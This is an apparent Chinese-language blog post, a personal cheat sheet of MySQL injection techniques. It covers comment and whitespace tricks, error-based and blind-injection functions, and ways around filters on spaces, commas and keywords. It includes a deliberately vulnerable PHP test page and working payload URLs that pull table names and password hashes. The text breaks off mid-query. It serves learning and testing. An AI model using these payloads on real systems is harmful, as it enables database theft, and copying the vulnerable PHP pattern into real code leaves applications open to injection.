    <published>2018-08-13T11:12:09.000Z</published>
    <updated>2018-11-29T09:38:35.643Z</updated>
    
    <content type="html"><![CDATA[<p>对于SQLi的一点总结，用于自查。</p><a id="more"></a><h1 id="0x00-Appetizer（开胃菜）"><a href="#0x00-Appetizer（开胃菜）" class="headerlink" title="0x00 Appetizer（开胃菜）"></a>0x00 Appetizer（开胃菜）</h1><h2 id="1-注释"><a href="#1-注释" class="headerlink" title="1. 注释"></a>1. 注释</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- </span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">//</span><br><span class="line">/**/</span><br><span class="line">内联注释：/!**/</span><br><span class="line">;%00（亲测很好用）</span><br></pre></td></tr></table></figure><h2 id="2-科学计数法"><a href="#2-科学计数法" class="headerlink" title="2. 科学计数法"></a>2. 科学计数法</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title,links <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">0e1</span><span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="keyword">user</span>,authentication_string,<span class="number">1e1</span><span class="keyword">from</span> mysql.<span class="string">`user`</span>;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337176614661.jpg" alt=""></p><h2 id="3-空白字符"><a href="#3-空白字符" class="headerlink" title="3. 空白字符"></a>3. 空白字符</h2><p>MySQL5的空白字符是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%09 %0A %0B %0C %0D %A0 %20</span><br></pre></td></tr></table></figure><h2 id="4-特殊符号"><a href="#4-特殊符号" class="headerlink" title="4. 特殊符号"></a>4. 特殊符号</h2><h3 id="4-1"><a href="#4-1" class="headerlink" title="4.1 +"></a>4.1 <code>+</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span>+<span class="number">1</span>,(<span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337176934323.jpg" alt=""></p><h3 id="4-2"><a href="#4-2" class="headerlink" title="4.2 -"></a>4.2 <code>-</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span><span class="number">-1</span>,(<span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337177540634.jpg" alt=""></p><h3 id="4-3-反引号"><a href="#4-3-反引号" class="headerlink" title="4.3 反引号"></a>4.3 反引号</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="string">`table_name`</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337178639891.jpg" alt=""></p><h3 id="4-4"><a href="#4-4" class="headerlink" title="4.4 ~"></a>4.4 <code>~</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span>~<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="string">`table_name`</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337180163769.jpg" alt=""></p><h3 id="4-5"><a href="#4-5" class="headerlink" title="4.5 !"></a>4.5 <code>!</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span>!<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="string">`table_name`</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337181916545.jpg" alt=""></p><h3 id="4-6"><a href="#4-6" class="headerlink" title="4.6 @"></a>4.6 <code>@</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span>@<span class="keyword">user</span>,(<span class="keyword">SELECT</span> <span class="string">`table_name`</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337183246329.jpg" alt=""></p><h3 id="4-7-1"><a href="#4-7-1" class="headerlink" title="4.7 .1"></a>4.7 <code>.1</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span>title<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>freebuf<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span><span class="comment">/*.1*/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="string">`table_name`</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337187106617.jpg" alt=""></p><h3 id="4-8-39-quot"><a href="#4-8-39-quot" class="headerlink" title="4.8 &#39; &quot;"></a>4.8 <code>&#39; &quot;</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">id</span>,title,links<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>freebuf<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span><span class="comment">/*.1*/</span><span class="keyword">SELECT</span><span class="string">'1'</span>,<span class="string">"2"</span>,<span class="comment">/**/</span><span class="string">`table_name`</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337188678656.jpg" alt=""></p><h3 id="4-9"><a href="#4-9" class="headerlink" title="4.9 ()"></a>4.9 <code>()</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title,links <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span>(<span class="keyword">SELECT</span>(<span class="number">1</span>),(<span class="number">2</span>),(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337190588346.jpg" alt=""></p><h3 id="4-10"><a href="#4-10" class="headerlink" title="4.10 {}"></a>4.10 <code>{}</code></h3><p>在说道这个之前，首先说一下数据库语法时用到的各类括号分别代表什么</p><blockquote><ul><li><code>&lt;&gt;</code>：用于分隔字符串，字符串为语法元素的名称，SQL语言的非终止符</li><li><code>::=</code>：定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。被定义的元素位于操作符的左边，规定定义位于操作符的右边。</li><li><code>[]</code>：方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。</li><li><code>{}</code>：花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。</li><li><code>|</code>：替换操作符。 该竖线表明竖线之后的规则部分对于竖线之前的部分是可替换的。 如果竖线出现的位置不在花括号或方括号内，那么它指定对于该规则定义的元素的一个完整替换项。如果竖线出现的位置在花括号或方括号内，那么它指定花括号对或方括号对最里面内容的替换项。</li><li><code>...</code>：省略号表明在规则中省略号应用的元素可能被重复多次。如果省略号紧跟在闭花括号”}”之后，那么它应用于闭花括号和开花括号”{“之间的规则部分。如果省略号出现在其他任何元素的后面，那么它只应用于该元素。</li><li><code>!! --</code></li></ul></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span>(<span class="keyword">select</span>&#123;s table_name&#125;<span class="keyword">from</span>&#123;f information_schema.tables&#125;<span class="keyword">where</span>&#123;w table_schema=<span class="keyword">database</span>()&#125;);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337201045502.jpg" alt=""></p><h2 id="5-SQLi能用的函数分类"><a href="#5-SQLi能用的函数分类" class="headerlink" title="5. SQLi能用的函数分类"></a>5. SQLi能用的函数分类</h2><h3 id="5-1-字符串截取函数"><a href="#5-1-字符串截取函数" class="headerlink" title="5.1 字符串截取函数"></a>5.1 字符串截取函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mid(version(),1,1)</span><br><span class="line">substr(version,1,1)</span><br><span class="line">substring(version(),1,1)</span><br><span class="line">lpad(version(),1,1)</span><br><span class="line">rpad(version(),1,1)</span><br><span class="line">left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1))</span><br></pre></td></tr></table></figure><h3 id="5-2-字符串连接函数"><a href="#5-2-字符串连接函数" class="headerlink" title="5.2 字符串连接函数"></a>5.2 字符串连接函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(version(),&apos;|&apos;,&apos;user()&apos;)  # 拼接字符串时只要有一个为null，则返回null</span><br><span class="line">concat_ws(&apos;|&apos;,1,2,3)            # 不会因为出现null而返回null，会返回其他正常的结果</span><br></pre></td></tr></table></figure><h3 id="5-3-字符串转换函数"><a href="#5-3-字符串转换函数" class="headerlink" title="5.3 字符串转换函数"></a>5.3 字符串转换函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char(49)</span><br><span class="line">hex(&apos;a&apos;)</span><br><span class="line">unhex(61)</span><br></pre></td></tr></table></figure><h3 id="5-4-报错注入常用函数"><a href="#5-4-报错注入常用函数" class="headerlink" title="5.4 报错注入常用函数"></a>5.4 报错注入常用函数</h3><h4 id="1-floor-rand-2-group-by"><a href="#1-floor-rand-2-group-by" class="headerlink" title="1. floor(rand()*2) + group by"></a>1. <code>floor(rand()*2)</code> + <code>group by</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))<span class="keyword">name</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">name</span>;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337263294608.jpg" alt=""></p><p>原理：<code>floor(rand(0)*2)</code>被计算多次导致。</p><h4 id="2-updatexml"><a href="#2-updatexml" class="headerlink" title="2. updatexml()"></a>2. <code>updatexml()</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337266295216.jpg" alt=""></p><p>原理：<code>updatexml()</code>第二个参数应为xml语句。</p><p>限制：最多32字符</p><h4 id="3-extractvalue"><a href="#3-extractvalue" class="headerlink" title="3. extractvalue()"></a>3. <code>extractvalue()</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337271173827.jpg" alt=""></p><p>原理：<code>extractvalue()</code>第二个参数应为xml语句。</p><p>限制：最多32字符</p><p>经过测试，在<code>mysql 5.7</code>的版本下，<code>exp()</code>、<code>geometrycollection()</code>、<code>multipoint()</code>、<code>polygon()</code>、<code>multipolygon()</code>、<code>linestring()</code>、<code>multilinestring()</code>无法使用。</p><p>在<code>mysql 5.5</code>版本下是可以使用上面几个函数进行报错注入的。</p><p>原理：BIGINT整型溢出</p><h3 id="5-5-时间盲注常用函数"><a href="#5-5-时间盲注常用函数" class="headerlink" title="5.5 时间盲注常用函数"></a>5.5 时间盲注常用函数</h3><h4 id="1-benchmark"><a href="#1-benchmark" class="headerlink" title="1. benchmark()"></a>1. <code>benchmark()</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">if</span>(<span class="keyword">LEFT</span>(<span class="keyword">VERSION</span>(),<span class="number">1</span>)=<span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="string">'1'</span>)),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337847193285.jpg" alt=""></p><p>原理：以上面的sql语句为例，<code>BENCHMARK()</code>将执行<code>SHA1(&#39;1&#39;)</code>这个工作5000000次，并统计其所花费的时间。</p><h4 id="2-sleep"><a href="#2-sleep" class="headerlink" title="2. sleep()"></a>2. <code>sleep()</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'A'</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">10</span>));</span><br></pre></td></tr></table></figure><h3 id="5-6-布尔盲注常用函数"><a href="#5-6-布尔盲注常用函数" class="headerlink" title="5.6 布尔盲注常用函数"></a>5.6 布尔盲注常用函数</h3><p>字符串截取函数+<code>ascii()</code>配合<code>limit</code>完成布尔盲注。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337864958694.jpg" alt=""></p><h1 id="0x02-Soup（调味汤）"><a href="#0x02-Soup（调味汤）" class="headerlink" title="0x02 Soup（调味汤）"></a>0x02 Soup（调味汤）</h1><p>这里总结了一下绕过基础过滤的方式。这边不说复写和大小写绕过了，因为大家都知道。</p><p>这边我写个基础的测试脚本，接下来的测试都是基于这个脚本而添加的相应的规则：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   $db = mysqli_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">   mysqli_select_db($db, <span class="string">'SecSpider'</span>);</span><br><span class="line">   $uid = strtolower($_GET[<span class="string">'uid'</span>]);</span><br><span class="line">   $id = waf($uid);</span><br><span class="line">   $query = <span class="string">"select id, title, tag from `freebuf` where id="</span>.$id.<span class="string">";"</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"sql: "</span>.$query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   $result = mysqli_query($db, $query);</span><br><span class="line">   $row = mysqli_fetch_array($result);</span><br><span class="line">   var_dump($row);</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $id = str_replace(<span class="string">' '</span>, <span class="string">''</span>,$id);</span><br><span class="line">       <span class="keyword">return</span> $id;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="2-1-过滤空格"><a href="#2-1-过滤空格" class="headerlink" title="2.1 过滤空格"></a>2.1 过滤空格</h2><p>可以用下面几种方式绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**/                            可代替空格</span><br><span class="line">/!*select all*/                 可代替空格，且能执行中间的sql语句</span><br><span class="line">()                              可代替空格</span><br><span class="line">%09 %0A %0B %0C %0D %A0 %20     可代替空格</span><br><span class="line">select~1或select+1或select-1</span><br><span class="line">select`table_name`from          可以不使用空格        </span><br><span class="line">+                               可代替空格</span><br><span class="line">&#123;&#125;                              在遇到select from时可以利用括号包裹绕过针对查询字段的空格过滤</span><br></pre></td></tr></table></figure><p>给个实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9999/php.php?uid=.1union(select~1,+1,(select`table_name`from/*!12345information_schema.tables%0awhere/**/table_schema=database()*/%0dlimit%0d%0a0,1))</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337949840847.jpg" alt=""></p><p>关于括号绕过的示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9999/php.php?uid=.1union(select-1,+1,&#123;x+table_name&#125;from&#123;x(information_schema.tables)&#125;where&#123;x(table_schema=database())&#125;)</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338902517730.jpg" alt=""></p><h2 id="2-2-过滤了逗号-默认加上了过滤空格"><a href="#2-2-过滤了逗号-默认加上了过滤空格" class="headerlink" title="2.2 过滤了逗号(默认加上了过滤空格)"></a>2.2 过滤了逗号(默认加上了过滤空格)</h2><p>在使用<code>union</code>的时候是比较害怕逗号被过滤的，可以用<code>join()</code>绕：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9999/php.php?uid=.1union(select+*from((select+1)a%0ajoin(select+2)b%0ajoin(select`table_name`from/**/information_schema.tables/**/where%0dtable_schema=database())c))</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337978509836.jpg" alt=""></p><p>注意这么几个细节：</p><ul><li>不能这么使用<code>/!*join*/</code></li><li><code>limit 0,1</code>中的逗号可以使用<code>limit 1 offset 0</code>这样的格式来代替</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9999/php.php?uid=.1union(select+*from((select+1)a%0ajoin(select+2)b%0ajoin(select`column_name`from/**/information_schema.columns/**/where%0dtable_name=%27freebuf%27/**/limit/**/1/**/offset/**/3)c))</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337988471571.jpg" alt=""></p><h2 id="2-3-编码绕过"><a href="#2-3-编码绕过" class="headerlink" title="2.3 编码绕过"></a>2.3 编码绕过</h2><p>说了上面两个较为常规的姿势，下面总结一下使用编码绕过的方式：</p><h3 id="2-3-1-URL编码"><a href="#2-3-1-URL编码" class="headerlink" title="2.3.1 URL编码"></a>2.3.1 URL编码</h3><p>一般不会成功…，这个时候不妨试一试两次编码绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格 =&gt; %20</span><br><span class="line">单引号 =&gt; %27</span><br><span class="line">左括号 =&gt; %28</span><br><span class="line">右括号 =&gt; %29</span><br><span class="line">百分号 =&gt; %25</span><br></pre></td></tr></table></figure><h3 id="2-3-2-十六进制编码"><a href="#2-3-2-十六进制编码" class="headerlink" title="2.3.2 十六进制编码"></a>2.3.2 十六进制编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…     # 对单个字符编码</span><br><span class="line">SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))     #对字符串编码</span><br></pre></td></tr></table></figure><h3 id="2-3-3-Unicode编码"><a href="#2-3-3-Unicode编码" class="headerlink" title="2.3.3 Unicode编码"></a>2.3.3 Unicode编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br></pre></td></tr></table></figure><p>关于应用的话个人认为有两种：</p><ul><li><p>宽字节注入</p><p>  关于宽字节注入，简单来说就是当单引号（<code>&#39;</code>）被转义为<code>\&#39;</code>时可以利用<code>%df%27</code>进行绕过。宽字节注入产生的原因是因为GBK编码为多字节编码，会认为两个字节代表一个汉字，举个例子，比如我传入的字段是<code>%df%27</code>，正常解码后为：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�&apos;</span><br></pre></td></tr></table></figure></li></ul><pre><code>而有趣的是在代码层（GBK编码）对`%df%27`的解析实际为`%df%5c%27`：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">運&apos;</span><br></pre></td></tr></table></figure>从而吃掉了`\`绕过了对`&apos;`的转义</code></pre><ul><li><p>MySQL字符编码绕过</p><p>  MySQL的字符串编码主要是由于MySQL字段的字符集和PHP mysqli客户端设置的字符集不同而导致的。</p><p>  MySQL字段的默认字符集为<code>latin1</code>，在设置客户端字符集为<code>utf8</code>后，服务端的相关字符集仍为<code>latin1</code>，所以PHP将数据存入数据库实际上完成了如下的字符编码转换：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utf8 --&gt; utf8 --&gt; latin1</span><br></pre></td></tr></table></figure></li></ul><pre><code>也就是会出现如下的情况：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;Ä&apos;=&apos;A&apos;; # 结果为1</span><br></pre></td></tr></table></figure>详情请看[P牛的研究][1]</code></pre><h1 id="0x03-Main-Course（主菜）"><a href="#0x03-Main-Course（主菜）" class="headerlink" title="0x03 Main Course（主菜）"></a>0x03 Main Course（主菜）</h1><p>知道了上面的基础绕过姿势，下面进入正餐，测试脚本和0x02相同，只是往上添加规则罢了。</p><p><strong>测试MySQL版本为5.7.23</strong></p><h2 id="3-1-各种关键字的绕过"><a href="#3-1-各种关键字的绕过" class="headerlink" title="3.1 各种关键字的绕过"></a>3.1 各种关键字的绕过</h2><h3 id="3-1-1-绕and-or-union-where-limit-group-by-hex-substr"><a href="#3-1-1-绕and-or-union-where-limit-group-by-hex-substr" class="headerlink" title="3.1.1 绕and,or,union,where,limit,group by,hex,substr"></a>3.1.1 绕<code>and</code>,<code>or</code>,<code>union</code>,<code>where</code>,<code>limit</code>,<code>group by</code>,<code>hex</code>,<code>substr</code></h3><blockquote><p>绕and和or</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure><blockquote><p>绕union<br>union =&gt; 1 || </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,title from freebuf where id=1 || (select substr((select table_name from information_schema.tables where table_schema=database()),1,1))=&apos;f&apos; limit 0,1;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338119206129.jpg" alt=""></p><blockquote><p>绕where<br>where =&gt; case when then else end</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,title from freebuf where id=1 || (select substr((select (case table_schema WHEN &apos;SecSpider&apos; then table_name else &apos;zzzzzzzzzz&apos; END) as c  from information_schema.tables group by c limit 1),1,1))=&apos;f&apos; limit 0,1;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338147661315.jpg" alt=""></p><blockquote><p>绕limit<br>limit =&gt; group by c having c=0</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select id,title from freebuf where id=1 || (select((select substr((select (case table_schema when &apos;SecSpider&apos; then table_name else &apos;1&apos; end) as c  from information_schema.tables group by c having c=0</span><br><span 